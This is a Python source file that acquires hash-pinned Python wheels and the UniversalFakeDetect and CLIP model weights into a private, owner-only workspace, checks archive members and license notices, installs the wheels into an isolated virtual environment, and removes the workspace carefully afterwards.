"""Qualification-only, pinned acquisition and private owned workspace; never an inference download."""
import argparse
import base64
import io
from contextlib import contextmanager,ExitStack
import signal
import email.parser
import hashlib
import json
import os
from pathlib import Path, PurePosixPath
import platform
import shutil
import ssl
import stat
import subprocess
import sys
import time
import urllib.parse
import urllib.error
import urllib.request
import zipfile

ROOT=Path(__file__).resolve().parents[1]
DATA='integrations/visual-score-reference/qualification-linux-cp313.json'
LOCK='integrations/visual-score-reference/qualification-linux-cp313.lock'
DATA_SHA='576e084e9d6ba3a68fe9d58ab0132b2c392836bf07ed0fd10877aa4d06b305cc'
NOTICE_DATA='integrations/visual-score-reference/qualification-notice-inventory.json'
NOTICE_SHA='304ebc76c2d2de149d62fa546fb56a96e094a05b83a4712681acb41534a5297c'
RESERVE=2*1024**3
MAX_NOTICE=4*1024**2
HEAD_URL='https://raw.githubusercontent.com/WisconsinAIVision/UniversalFakeDetect/030495aea3300a8b54c0ec37ec7fe1dd7e63c619/pretrained_weights/fc_weights.pth'
MODEL_URL='https://huggingface.co/openai/clip-vit-large-patch14/resolve/32bd64288804d66eefd0ccbe215aa642df71cc41/model.safetensors'
HOSTS={'raw.githubusercontent.com','files.pythonhosted.org','download-r2.pytorch.org','download.pytorch.org','huggingface.co','cdn-lfs.huggingface.co','cas-bridge.xethub.hf.co','us.aws.cdn.hf.co'}

class QualificationRefused(Exception):pass
class CleanupUncertain(QualificationRefused):pass

ACQUISITION_OPERATIONS=frozenset(('capacity','head_fetch','head_layout','wheel','backbone','notice'))
ACQUISITION_CATEGORIES=frozenset(('http_error','url_error','timeout','os_error','asset_refused','qualification_refused','invalid_value','cancelled','unexpected'))
ACQUISITION_REASONS=frozenset(('http_status','encoding_refused','declared_size_mismatch','byte_limit','sha256_mismatch','git_blob_mismatch','reserve_or_deadline','model_identity','head_format','head_numeric','refused','unknown'))
ACQUISITION_COUNTS={'head_fetched':1,'head_layout_validated':1,'wheels_completed':39,'current_wheel_ordinal':39,'backbone_verified':1,'notice_inventory_written':1}

class AcquisitionPredicate(QualificationRefused):
 def __init__(self,reason,http_status=None):
  self.reason=reason if type(reason)is str and reason in ACQUISITION_REASONS else 'unknown'
  self.http_status=http_status if type(http_status)is int and 100<=http_status<=599 else None
  super().__init__('acquisition_refused')

def acquisition_check(ok,reason,http_status=None):
 if not ok:raise AcquisitionPredicate(reason,http_status)

def validate_acquisition_diagnostic(value):
 if not (type(value)is dict and set(value)=={'profile','operation','category','reason_code','http_status','role_counts'}):raise QualificationRefused('qualification_refused')
 if not (value['profile']=='visual-score-acquisition-diagnostic/v1' and type(value['operation'])is str and value['operation']in ACQUISITION_OPERATIONS and type(value['category'])is str and value['category']in ACQUISITION_CATEGORIES and type(value['reason_code'])is str and value['reason_code']in ACQUISITION_REASONS):raise QualificationRefused('qualification_refused')
 status=value['http_status'];counts=value['role_counts']
 if not (status is None or type(status)is int and 100<=status<=599):raise QualificationRefused('qualification_refused')
 if not (type(counts)is dict and set(counts)==set(ACQUISITION_COUNTS) and all(type(counts[k])is int and 0<=counts[k]<=maximum for k,maximum in ACQUISITION_COUNTS.items())):raise QualificationRefused('qualification_refused')
 if not (counts['head_layout_validated']<=counts['head_fetched'] and (value['operation']=='wheel' or counts['current_wheel_ordinal']==0)):raise QualificationRefused('qualification_refused')
 result={**value,'role_counts':dict(counts)}
 if len(json.dumps(result,sort_keys=True,separators=(',',':'),allow_nan=False).encode())>4096:raise QualificationRefused('qualification_refused')
 return result

class AcquisitionFailed(QualificationRefused):
 def __init__(self,observation):
  self.observation=validate_acquisition_diagnostic(observation)
  super().__init__('acquisition_failed')

def acquisition_failure(error,operation='capacity',counts=None):
 # Error content is NEVER output. Only source-owned predicates and fixed types.
 category='unexpected';reason='unknown';status=None
 if isinstance(error,AcquisitionPredicate):category='qualification_refused';reason=error.reason;status=error.http_status
 elif isinstance(error,urllib.error.HTTPError):
  category='http_error';reason='http_status';status=error.code if type(error.code)is int and 100<=error.code<=599 else None
 elif isinstance(error,urllib.error.URLError):category='timeout' if isinstance(error.reason,TimeoutError) else 'url_error'
 elif isinstance(error,TimeoutError):category='timeout'
 elif isinstance(error,KeyboardInterrupt):category='cancelled'
 elif isinstance(error,OSError):category='os_error'
 elif isinstance(error,QualificationRefused):
  category='timeout' if error.args==('acquisition_deadline',) else 'qualification_refused';reason='reserve_or_deadline' if category=='timeout' else 'refused'
 else:
  from tools.visual_score_assets import Refused
  if isinstance(error,Refused):category='asset_refused';reason=error.reason if error.reason in {'model_identity','head_format','head_numeric'} else 'refused'
  elif isinstance(error,(ValueError,TypeError,KeyError)):category='invalid_value'
 return validate_acquisition_diagnostic({'profile':'visual-score-acquisition-diagnostic/v1','operation':operation,'category':category,'reason_code':reason,'http_status':status,'role_counts':dict(counts) if counts is not None else {k:0 for k in ACQUISITION_COUNTS}})

def need(ok):
 if not ok:raise QualificationRefused('qualification_refused')

def sha(raw):return hashlib.sha256(raw).hexdigest()

def raw_file(path,cap):
 fd=os.open(path,os.O_RDONLY|os.O_NOFOLLOW|os.O_NONBLOCK)
 try:
  st=os.fstat(fd);need(stat.S_ISREG(st.st_mode) and 0<=st.st_size<=cap)
  data=b''
  while len(data)<=cap:
   piece=os.read(fd,min(65536,cap+1-len(data)))
   if not piece:break
   data+=piece
  current=os.fstat(fd);need(len(data)==st.st_size and (current.st_dev,current.st_ino,current.st_mode,current.st_size,current.st_mtime_ns,current.st_ctime_ns)==(st.st_dev,st.st_ino,st.st_mode,st.st_size,st.st_mtime_ns,st.st_ctime_ns));return data
 finally:os.close(fd)

COMPANION='integrations/visual-score-reference/tokenizers-0.23.3-source-notices-v1.json'
COMPANION_SHA='0073729ee413c85b56664bfbee074dcb25e589378acf71921a533b5eddb4347c'
COMPANION_BYTES=623310
COMPANION_LEAF='tokenizers-source-notices.json'
COMPANION_POLICY='private-reference-source-notice-preservation/v1'
TOKENIZER_TARGET={'name':'tokenizers','version':'0.23.3','filename':'tokenizers-0.23.3-cp310-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl','bytes':3396193,'sha256':'376851d22bcf9d650a5c3090bb83e6cf9e895fbf0595369fa4cd43c1f69b5f87','metadata_bytes':9830,'metadata_sha256':'87032ea29ec14be956ce0f15d164a8f436d6f1adbe19b261d6c179d9184f5cba'}

def _canonical(value):return json.dumps(value,sort_keys=True,separators=(',',':'),ensure_ascii=True,allow_nan=False).encode()

def _decode_source_companion(raw):
 # Hash BEFORE parsing. This is a fixed reviewed source projection, not caller policy.
 need(type(raw)is bytes and len(raw)==COMPANION_BYTES and sha(raw)==COMPANION_SHA)
 d=json.loads(raw);need(_canonical(d)+b'\n'==raw)
 need(type(d)is dict and set(d)=={'format','policy','purpose','target','source','carried_notices','counts','packages','texts','associations','claims','limits'})
 need(d['format']=='visual-score-exact-wheel-source-preservation/v1' and d['policy']==COMPANION_POLICY and d['purpose']=='PRIVATE_REFERENCE_QUALIFICATION_ONLY' and d['target']==TOKENIZER_TARGET and d['carried_notices']==[])
 need(d['counts']=={'packages':153,'registry':151,'workspace':2,'texts':93,'text_bytes':300341,'associations':309,'source_carried_associations':307,'upstream_supplement_associations':2})
 need(type(d['claims'])is dict and set(d['claims'])=={'compiled_coverage_established','license_clearance','redistribution_approved','distribution_admitted','source_build_reproduced','accuracy_established','original_requirement_closed'} and all(v is False for v in d['claims'].values()))
 source=d['source'];need(type(source)is dict and source['commit']=='301277072263fb3830eb66eec7e47adadf76f1dc' and source['lock_sha256']=='afcedf7f2ebe008b068d7afd25e77f7d9d8e433c24153bc35a1eb5611083ee5b' and source['sdist_sha256']=='cded33237c77caeef62944d32aa9a7ef42bdce2b3497e18d137e072a8c4be438')
 need(source['publisher_provenance']['subject_sha256']==TOKENIZER_TARGET['sha256'] and source['publisher_provenance']['commit']==source['commit'] and source['publisher_provenance']['independently_verified_attestation'] is False)
 texts=d['texts'];need(type(texts)is list and len(texts)==93)
 seen={};decoded=0
 for row in texts:
  need(type(row)is dict and set(row)=={'sha256','bytes','base64'} and type(row['bytes'])is int and 0<row['bytes']<=16384 and type(row['base64'])is str)
  body=base64.b64decode(row['base64'],validate=True);need(len(body)==row['bytes'] and sha(body)==row['sha256'] and row['sha256']not in seen and base64.b64encode(body).decode()==row['base64'])
  decoded+=len(body);need(decoded<=300341);seen[row['sha256']]=row['bytes']
 need(decoded==300341 and [r['sha256']for r in texts]==sorted(seen))
 packages=d['packages'];need(type(packages)is list and len(packages)==153)
 package_map={}
 for row in packages:
  need(type(row)is dict and set(row)=={'id','name','version','source_kind','source','checksum','license_declared','selected_features','compiled_incorporation','association_ids'} and len(_canonical(row))<=1024)
  need(type(row['name'])is str and type(row['version'])is str and row['id']==row['name']+'@'+row['version'] and row['id']not in package_map and row['selected_features']=='unknown' and row['compiled_incorporation']=='unknown')
  need(row['license_declared']is None or type(row['license_declared'])is str)
  if row['source_kind']=='registry':need(row['source']=='registry+https://github.com/rust-lang/crates.io-index' and type(row['checksum'])is str and len(row['checksum'])==64 and set(row['checksum'])<=set('0123456789abcdef'))
  else:need(row['source_kind']=='workspace' and row['id']in ('tokenizers@0.23.2','tokenizers-python@0.23.3') and row['source']is None and row['checksum']is None)
  need(type(row['association_ids'])is list and row['association_ids']==sorted(set(row['association_ids'])))
  package_map[row['id']]=row
 need([r['id']for r in packages]==sorted(package_map) and sum(r['source_kind']=='registry'for r in packages)==151)
 associations=d['associations'];need(type(associations)is list and len(associations)==309)
 indexed={};references={k:[] for k in package_map};roles=[]
 for row in associations:
  need(type(row)is dict and len(_canonical(row))<=768 and set(row)in ({'id','package','term_sha256','role','archive_sha256','member','retained_source_path'},{'id','package','term_sha256','role','archive_sha256','member','retained_source_path','upstream'}))
  need(row['id']==sha(_canonical({k:v for k,v in row.items()if k!='id'})) and row['id']not in indexed and row['package']in package_map and row['term_sha256']in seen)
  package=package_map[row['package']];need(row['archive_sha256']==(package['checksum']or source['sdist_sha256']))
  need(type(row['member'])is str and type(row['retained_source_path'])is str and row['retained_source_path']in ('sbom/nli-native/sources/'+row['term_sha256']+'.txt','sbom/c2pa-native/sources/'+row['term_sha256']+'.txt'))
  need(row['role']in ('source-carried','project-source-carried','upstream-source-supplement'))
  if row['role']=='upstream-source-supplement':need(row['package']=='defmt-parser@1.0.0' and 'upstream'in row)
  else:need('upstream'not in row and row['role']==('source-carried'if package['checksum']else 'project-source-carried'))
  roles.append(row['role']);indexed[row['id']]=row;references[row['package']].append(row['id'])
 need([r['id']for r in associations]==sorted(indexed) and roles.count('upstream-source-supplement')==2 and all(sorted(references[k])==v['association_ids']and references[k]for k,v in package_map.items()) and {r['term_sha256']for r in associations}==set(seen))
 return d

def _source_companion(raw):
 try:return _decode_source_companion(raw)
 except (ValueError,TypeError,KeyError,IndexError,AttributeError):raise QualificationRefused('source_companion_refused') from None

def source_companion(root=ROOT):
 raw=raw_file(root/COMPANION,1024**2);return raw,_source_companion(raw)

def companion_summary():
 return {'policy':COMPANION_POLICY,'sha256':COMPANION_SHA,'bytes':COMPANION_BYTES,'packages':153,'source_texts':93,'source_text_bytes':300341,'associations':309,'purpose':'PRIVATE_REFERENCE_QUALIFICATION_ONLY','carried_notices':[],'compiled_coverage_established':False,'license_clearance':False,'redistribution_approved':False}

def workspace_companion(path):
 expected,_=source_companion();leaf=path/COMPANION_LEAF
 before=os.stat(leaf,follow_symlinks=False);need(stat.S_ISREG(before.st_mode) and stat.S_IMODE(before.st_mode)==0o600 and before.st_uid==os.geteuid() and before.st_nlink==1)
 raw=raw_file(leaf,1024**2);need(raw==expected)
 after=os.stat(leaf,follow_symlinks=False)
 identity=lambda s:(s.st_dev,s.st_ino,s.st_mode,s.st_uid,s.st_nlink,s.st_size,s.st_mtime_ns,s.st_ctime_ns)
 need(identity(before)==identity(after));return identity(after)

def notice_observations(path):
 workspace_companion(path);d=json.loads(raw_file(path/'notice-observations.json',2*1024**2))
 need(type(d)is dict and set(d)=={'format','packages','legal_clearance'} and d['format']=='visual-score-wheel-notices/v2' and d['legal_clearance']is False and type(d['packages'])is list and len(d['packages'])==39)
 need([(r['name'],r['version'])for r in d['packages']]==[(r['name'],r['version'])for r in selection()['packages']])
 need(all(type(r['notices'])is list and (r['name']=='tokenizers' or bool(r['notices']))for r in d['packages']))
 tokens=[r for r in d['packages']if r['name']=='tokenizers'];need(len(tokens)==1 and tokens[0]['notices']==[] and tokens[0]['carried_notices']==[] and tokens[0]['supplemental_source_preservation']==companion_summary())
 return d

def seal_inventory(path,identity):
 check_root(path,identity);before=workspace_companion(path);entries=snapshot(path);need(workspace_companion(path)==before)
 need(COMPANION_LEAF in entries and stat.S_ISREG(entries[COMPANION_LEAF][2]) and entries[COMPANION_LEAF][4]==COMPANION_BYTES)
 return {'format':'visual-score-workspace-inventory/v2','workspace_devino':identity,'entries':entries,'source_notice_companion':companion_summary()}

def selection(root=ROOT):
 raw=raw_file(root/DATA,256*1024);need(sha(raw)==DATA_SHA);data=json.loads(raw)
 need(sha(raw_file(root/NOTICE_DATA,65536))==NOTICE_SHA)
 source_companion(root)
 rows=data['packages'];need(len(rows)==39 and len({x['name'] for x in rows})==39)
 expected='# Fixed CPython3.13/Linuxx86_64 CPU runtime + qualification-only HF reference. No dependency resolution at install.\n'+''.join(x['name']+'=='+x['version']+' --hash=sha256:'+x['wheel']['sha256']+'\n' for x in rows)
 need(raw_file(root/LOCK,8192).decode()==expected)
 for row in rows:
  meta=raw_file(root/row['retained_metadata_path'],256*1024)
  need(len(meta)==row['metadata_bytes'] and sha(meta)==row['metadata_sha256'])
  m=email.parser.BytesParser().parsebytes(meta)
  need(m['Name'].lower().replace('_','-')==row['name'] and m['Version']==row['version'])
 return data

def capacity_facts(path):
 need(sys.platform=='linux' and platform.machine()=='x86_64' and sys.version_info[:2]==(3,13))
 free=shutil.disk_usage(path).free
 fields=dict(line.split(':',1) for line in Path('/proc/meminfo').read_text().splitlines())
 available=int(fields['MemAvailable'].split()[0])*1024
 cpus=os.cpu_count();need(type(cpus)is int and cpus>0)
 need(free>=14*1024**3 and available>=8*1024**3)
 return {'profile':'visual-score-capacity/v1','platform':sys.platform,'machine':platform.machine(),'python_version':list(sys.version_info[:3]),'cpu_count':cpus,'available_memory_bytes':available,'free_disk_bytes':free,'minimum_memory_bytes':8*1024**3,'minimum_free_disk_bytes':14*1024**3,'pass':True}

def capacity(path):return capacity_facts(path)

def credential_free():
 return {'PATH':os.defpath,'HOME':'/nonexistent','PYTHONNOUSERSITE':'1','PYTHONDONTWRITEBYTECODE':'1','PIP_CONFIG_FILE':os.devnull,'PIP_DISABLE_PIP_VERSION_CHECK':'1','HF_HUB_OFFLINE':'1','TRANSFORMERS_OFFLINE':'1','HF_HUB_DISABLE_TELEMETRY':'1','DO_NOT_TRACK':'1','CUDA_VISIBLE_DEVICES':'','OMP_NUM_THREADS':'1','MKL_NUM_THREADS':'1','OPENBLAS_NUM_THREADS':'1','TOKENIZERS_PARALLELISM':'false'}

class Redirect(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,req,fp,code,msg,headers,newurl):
  u=urllib.parse.urlsplit(newurl)
  need(u.scheme=='https' and u.hostname in HOSTS and not u.username and not u.password and u.port in (None,443))
  return super().redirect_request(req,fp,code,msg,headers,newurl)

def _acquire_file(url,destination,size,expected_sha=None,git_blob=None,deadline=None):
 u=urllib.parse.urlsplit(url);need(u.scheme=='https' and u.hostname in HOSTS and not u.username and not u.password)
 deadline=min(deadline or time.monotonic()+300,time.monotonic()+300)
 opener=urllib.request.build_opener(urllib.request.ProxyHandler({}),Redirect(),urllib.request.HTTPSHandler(context=ssl.create_default_context()))
 fd=None;count=0;h=hashlib.sha256();git=hashlib.sha1(('blob '+str(size)+'\0').encode())
 try:
  fd=os.open(destination,os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
  with opener.open(urllib.request.Request(url,headers={'Accept-Encoding':'identity','User-Agent':'AITrustID-reference-qualification/1'}),timeout=max(.1,min(20,deadline-time.monotonic()))) as response:
   acquisition_check(response.status==200,'http_status',response.status)
   acquisition_check(response.headers.get('Content-Encoding','identity')=='identity','encoding_refused',response.status)
   declared=response.headers.get('Content-Length');acquisition_check(declared is None or declared==str(size),'declared_size_mismatch',response.status)
   while True:
    acquisition_check(time.monotonic()<deadline and shutil.disk_usage(destination.parent).free>=RESERVE,'reserve_or_deadline',response.status)
    piece=response.read(min(65536,size+1-count))
    if not piece:break
    count+=len(piece);acquisition_check(count<=size,'byte_limit',response.status);h.update(piece);git.update(piece)
    view=memoryview(piece)
    while view:view=view[os.write(fd,view):]
   acquisition_check(time.monotonic()<deadline,'reserve_or_deadline',response.status)
   acquisition_check(count==size,'byte_limit',response.status)
   acquisition_check(expected_sha is None or h.hexdigest()==expected_sha,'sha256_mismatch',response.status)
   acquisition_check(git_blob is None or git.hexdigest()==git_blob,'git_blob_mismatch',response.status)
  os.fsync(fd)
 finally:
  if fd is not None:owned=fd;fd=None;os.close(owned)
 return {'bytes':count,'sha256':h.hexdigest()}

@contextmanager
def total_budget(seconds):
 """Linux main-thread whole-operation deadline, not merely urllib's per-read timeout."""
 need(type(seconds) in (int,float) and 0<seconds<=300 and signal.getitimer(signal.ITIMER_REAL)==(0.,0.))
 previous=signal.getsignal(signal.SIGALRM)
 def expired(signum,frame):raise QualificationRefused('acquisition_deadline')
 signal.signal(signal.SIGALRM,expired)
 try:
  signal.setitimer(signal.ITIMER_REAL,seconds);yield
 finally:
  signal.setitimer(signal.ITIMER_REAL,0);signal.signal(signal.SIGALRM,previous)

def acquire_file(url,destination,size,expected_sha=None,git_blob=None,deadline=None):
 remaining=300 if deadline is None else min(300,deadline-time.monotonic())
 with total_budget(remaining):return _acquire_file(url,destination,size,expected_sha,git_blob,deadline)

def safe_member(info):
 p=PurePosixPath(info.filename)
 need(info.filename and len(info.filename)<=1024 and p.as_posix()==info.filename.rstrip('/') and not p.is_absolute() and '\\' not in info.filename and all(x not in ('','.','..') for x in p.parts) and not stat.S_ISLNK(info.external_attr>>16) and not info.flag_bits&1)
 return p

def inspect_wheel(path,row):
 """No extraction/import; preserve carried notices or the fixed private source companion before pip."""
 notices=[]
 target=TOKENIZER_TARGET
 special=(row.get('name'),row.get('version'),row.get('metadata_sha256'),row.get('wheel',{}))==(target['name'],target['version'],target['metadata_sha256'],{'filename':target['filename'],'size':target['bytes'],'sha256':target['sha256'],'url':row.get('wheel',{}).get('url')})
 if special:
  raw=raw_file(path,target['bytes']);need(len(raw)==target['bytes'] and sha(raw)==target['sha256']);source_companion()
 with zipfile.ZipFile(io.BytesIO(raw) if special else path) as archive:
  members=archive.infolist();need(0<len(members)<=40000 and len({x.filename for x in members})==len(members))
  total=0;by={}
  for info in members:
   safe_member(info);need(0<=info.file_size<=2*1024**3 and info.compress_type in (zipfile.ZIP_STORED,zipfile.ZIP_DEFLATED))
   total+=info.file_size;need(total<=4*1024**3);by[info.filename]=info
  # Vendored distributions may retain their own metadata as package data.
  # Only the single archive-root dist-info record describes this locked wheel.
  metas=[x for x in by if len(PurePosixPath(x).parts)==2 and x.endswith('.dist-info/METADATA')];need(len(metas)==1)
  meta=by[metas[0]];need(meta.file_size<=256*1024)
  data=archive.read(meta);need(sha(data)==row['metadata_sha256'])
  if special:need(len(data)==target['metadata_bytes'])
  prefix=metas[0][:-len('METADATA')];declared=[]
  for name in row['license_files_declared']:
   need(type(name)is str and not PurePosixPath(name).is_absolute() and '..' not in PurePosixPath(name).parts)
   found=[x for x in [prefix+'licenses/'+name,prefix+name] if x in by]
   need(len(found)==1);declared+=found
  candidates=set(declared)
  for name,info in by.items():
   leaf=PurePosixPath(name).name.lower()
   if not info.is_dir() and any(leaf.startswith(v) for v in ('license','licence','notice','copying','copyright')):candidates.add(name)
  need(not candidates if special else bool(candidates));notice_bytes=0
  for name in sorted(candidates):
   info=by[name];need(info.file_size<=MAX_NOTICE);notice_bytes+=info.file_size;need(notice_bytes<=64*1024**2)
   data=archive.read(info);need(len(data)==info.file_size)
   notices.append({'member':name,'bytes':len(data),'sha256':sha(data),'publisher_declared':name in declared})
 result={'name':row['name'],'version':row['version'],'expanded_bytes':total,'notices':notices}
 if special:result.update(carried_notices=[],supplemental_source_preservation=companion_summary())
 return result

MAX_TREE_ENTRIES=60000
MAX_TREE_DEPTH=48
MAX_TREE_PATH=4096

def _tree_row(info):
 need(info.st_uid==os.geteuid() and (stat.S_ISREG(info.st_mode) or stat.S_ISDIR(info.st_mode) or stat.S_ISLNK(info.st_mode)))
 directory=stat.S_ISDIR(info.st_mode)
 return [info.st_dev,info.st_ino,info.st_mode,info.st_uid,0 if directory else info.st_size,0 if directory else info.st_mtime_ns]

def _leaf(name):
 need(type(name)is str and name not in ('','.','..') and '/' not in name and '\\' not in name and '\0' not in name)
 return name

@contextmanager
def _directory(parentfd,name,expected=None):
 _leaf(name) if parentfd is not None else need(name=='/')
 fd=os.open(name,os.O_RDONLY|os.O_DIRECTORY|os.O_NOFOLLOW|os.O_CLOEXEC,dir_fd=parentfd)
 try:
  need(stat.S_ISDIR(os.fstat(fd).st_mode))
  if expected is not None:
   need(_tree_row(os.fstat(fd))==expected and _tree_row(os.stat(name,dir_fd=parentfd,follow_symlinks=False))==expected)
  yield fd
 finally:
  owned=fd;fd=None;os.close(owned) # relinquish before one close attempt; never retry a released number

@contextmanager
def _parent_directory(path):
 need(path.is_absolute() and path.name not in ('','.','..') and '..' not in path.parts)
 # Resolve only the trusted parent location, accommodating platform temporary aliases.
 # The selected root leaf is never resolved/adopted through a symlink.
 canonical=path.parent.resolve(strict=True);need(len(canonical.parts)<=MAX_TREE_DEPTH)
 with ExitStack() as held:
  fd=held.enter_context(_directory(None,'/'))
  for name in canonical.parts[1:]:fd=held.enter_context(_directory(fd,name))
  yield fd

def _names(fd):
 out=set()
 with os.scandir(fd) as entries:
  for entry in entries:
   name=_leaf(entry.name);need(name not in out and len(out)<MAX_TREE_ENTRIES);out.add(name)
 return out

def _capture_tree(rootfd):
 out={}
 def visit(fd,prefix,depth):
  need(depth<=MAX_TREE_DEPTH)
  with os.scandir(fd) as entries:
   for entry in entries:
    name=_leaf(entry.name);relative=prefix+name;need(len(relative)<=MAX_TREE_PATH and relative not in out and len(out)<MAX_TREE_ENTRIES)
    row=_tree_row(os.stat(name,dir_fd=fd,follow_symlinks=False));out[relative]=row
    if stat.S_ISDIR(row[2]):
     with _directory(fd,name,row) as child:
      visit(child,relative+'/',depth+1)
      need(_tree_row(os.fstat(child))==row and _tree_row(os.stat(name,dir_fd=fd,follow_symlinks=False))==row)
 visit(rootfd,'',0)
 return out

def snapshot(directory):
 """Bounded descriptor-only enumeration; no intermediate directory-link traversal."""
 directory=Path(directory)
 with _parent_directory(directory) as parent:
  row=_tree_row(os.stat(_leaf(directory.name),dir_fd=parent,follow_symlinks=False));need(stat.S_ISDIR(row[2]))
  with _directory(parent,directory.name,row) as rootfd:
   out=_capture_tree(rootfd)
   need(_tree_row(os.fstat(rootfd))==row and _tree_row(os.stat(directory.name,dir_fd=parent,follow_symlinks=False))==row)
   return out

def _inventory_children(inventory):
 need(type(inventory)is dict and len(inventory)<=MAX_TREE_ENTRIES)
 children={'':set()}
 for relative,row in inventory.items():
  need(type(relative)is str and 0<len(relative)<=MAX_TREE_PATH and not relative.startswith('/') and '\\' not in relative)
  parts=relative.split('/');need(len(parts)<=MAX_TREE_DEPTH and all(_leaf(name)==name for name in parts))
  need(type(row)is list and len(row)==6 and all(type(x)is int for x in row) and row[0]>=0 and row[1]>=0 and row[3]==os.geteuid() and row[4]>=0)
  need(stat.S_ISREG(row[2]) or stat.S_ISDIR(row[2]) or stat.S_ISLNK(row[2]))
  parent='/'.join(parts[:-1]);children.setdefault(parent,set()).add(parts[-1])
  if stat.S_ISDIR(row[2]):need(row[4:]==[0,0]);children.setdefault(relative,set())
 for parent in children:
  need(parent=='' or parent in inventory and stat.S_ISDIR(inventory[parent][2]))
 return children

def write_new(path,data):
 fd=os.open(path,os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
 try:
  view=memoryview(data)
  while view:view=view[os.write(fd,view):]
  os.fsync(fd)
 finally:os.close(fd)

def check_root(path,identity):
 need(path.is_absolute() and path.name.startswith('visual-score-') and len(identity)==2)
 st=path.lstat();need(stat.S_ISDIR(st.st_mode) and not path.is_symlink() and st.st_uid==os.geteuid() and stat.S_IMODE(st.st_mode)==0o700 and [st.st_dev,st.st_ino]==identity)

def cleanup(path,identity,inventory):
 """Only held nofollow directories and single-component mutations; drift is uncertainty."""
 path=Path(path)
 try:
  check_root(path,identity);children=_inventory_children(inventory)
  with _parent_directory(path) as parent:
   rootrow=_tree_row(os.stat(_leaf(path.name),dir_fd=parent,follow_symlinks=False))
   need(stat.S_ISDIR(rootrow[2]) and rootrow[:2]==identity)
   with _directory(parent,path.name,rootrow) as rootfd:
    # Keep original public preflight plus a second check through our held root.
    # A callback/substitution after snapshot cannot redirect the later mutations.
    need(snapshot(path)==inventory and _capture_tree(rootfd)==inventory)
    chain=[(rootfd,parent,path.name,rootrow)]
    def relations():
     check_root(path,identity)
     for fd,owner,name,row in chain:
      need(_tree_row(os.fstat(fd))==row and _tree_row(os.stat(name,dir_fd=owner,follow_symlinks=False))==row)
    def remove_contents(fd,prefix):
     relations();need(_names(fd)==children[prefix])
     for name in sorted(children[prefix]):
      relative=(prefix+'/' if prefix else '')+name;row=inventory[relative]
      relations();need(_tree_row(os.stat(name,dir_fd=fd,follow_symlinks=False))==row)
      if stat.S_ISDIR(row[2]):
       with _directory(fd,name,row) as child:
        chain.append((child,fd,name,row))
        try:
         remove_contents(child,relative);relations();need(_names(child)==set())
         os.rmdir(name,dir_fd=fd) # leaf only; never traverse a replaceable intermediate path
        finally:chain.pop()
      else:os.unlink(name,dir_fd=fd) # legitimate captured symlink is removed, never followed
      relations()
     need(_names(fd)==set())
    remove_contents(rootfd,'');relations();os.rmdir(path.name,dir_fd=parent)
    try:os.stat(path.name,dir_fd=parent,follow_symlinks=False)
    except FileNotFoundError:pass
    else:raise CleanupUncertain('cleanup_uncertain') # preserve a late root successor
 except (QualificationRefused,OSError,ValueError,TypeError,KeyError):raise CleanupUncertain('cleanup_uncertain') from None

def install(path,identity):
 from tools.visual_score_runtime import isolation
 isolation();check_root(path,identity);selection();workspace_companion(path)
 env=credential_free();env['HOME']=str(path/'home')
 for row in selection()['packages']:
  w=row['wheel'];file=path/'wheels'/w['filename']
  with file.open('rb') as stream:
   h=hashlib.file_digest(stream,'sha256')
  need(file.stat().st_size==w['size'] and h.hexdigest()==w['sha256']);inspect_wheel(file,row)
 workspace_companion(path)
 for command in [[sys.executable,'-I','-B','-m','venv',str(path/'venv')],[str(path/'venv/bin/python'),'-I','-B','-m','pip','install','--no-index','--find-links',str(path/'wheels'),'--no-deps','--no-compile','--require-hashes','--no-cache-dir','-r',str(ROOT/LOCK)]]:
  call(command,timeout=240,env=env)

def acquire(path):
 operation='capacity';counts={k:0 for k in ACQUISITION_COUNTS}
 try:
  operation='notice';companion,_=source_companion();selection();operation='capacity';capacity(path.parent);need(not path.exists());path.mkdir(mode=0o700)
  for name in ['wheels','models','home','tmp','fixtures']:(path/name).mkdir(mode=0o700)
  operation='notice';write_new(path/COMPANION_LEAF,companion);workspace_companion(path)
  from tools.visual_score_assets import HEAD_BYTES,HEAD_GIT_BLOB,pinned_head,BACKBONE_BYTES,BACKBONE_SHA
  deadline=time.monotonic()+900
  operation='head_fetch'
  head=acquire_file(HEAD_URL,path/'models/fc_weights.pth',HEAD_BYTES,git_blob=HEAD_GIT_BLOB,deadline=deadline);counts['head_fetched']=1
  operation='head_layout';pinned_head(raw_file(path/'models/fc_weights.pth',HEAD_BYTES));counts['head_layout_validated']=1
  data=selection();notices=[];expanded=0
  for ordinal,row in enumerate(data['packages'],1):
   operation='wheel';counts['current_wheel_ordinal']=ordinal
   w=row['wheel'];file=path/'wheels'/w['filename'];acquire_file(w['url'],file,w['size'],w['sha256'],deadline=deadline)
   notice=inspect_wheel(file,row);expanded+=notice['expanded_bytes'];need(expanded<=4*1024**3);notices.append(notice);counts['wheels_completed']+=1
  counts['current_wheel_ordinal']=0;operation='backbone'
  acquire_file(MODEL_URL,path/'models/model.safetensors',BACKBONE_BYTES,BACKBONE_SHA,deadline=deadline);counts['backbone_verified']=1
  operation='notice'
  write_new(path/'notice-observations.json',json.dumps({'format':'visual-score-wheel-notices/v2','packages':notices,'legal_clearance':False},sort_keys=True).encode());counts['notice_inventory_written']=1
  return head
 except BaseException as error:
  try:failure=AcquisitionFailed(acquisition_failure(error,operation,counts))
  except BaseException:raise error from None
  raise failure from None

def call(argv,timeout=240,env=None):
 """Silent owned process group; same-group pip bootstrap descendants are reaped on timeout."""
 import signal
 child=subprocess.Popen(argv,stdin=subprocess.DEVNULL,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,start_new_session=True,close_fds=True,env=env or credential_free())
 try:
  need(child.wait(timeout=timeout)==0)
 finally:
  if child.returncode is None:
   try:os.killpg(child.pid,signal.SIGKILL)
   except ProcessLookupError:pass
   finally:child.wait(timeout=5)

def make_fixtures(path):
 from tools.visual_score_runtime import isolation
 isolation()
 from PIL import Image
 for name,size in [('gradient',(225,227)),('sliver',(3,257))]:
  with Image.new('RGB',size) as image:
   image.putdata([((x*17+y*3)%256,(x*5+y*11)%256,(x*13+y*7)%256) for y in range(size[1]) for x in range(size[0])])
   import io
   data=io.BytesIO();image.save(data,format='PNG');write_new(path/'fixtures'/(name+'.png'),data.getvalue())
   if name=='gradient':
    data=io.BytesIO();image.save(data,format='JPEG',quality=90,subsampling=0,progressive=False);write_new(path/'fixtures/baseline.jpg',data.getvalue())
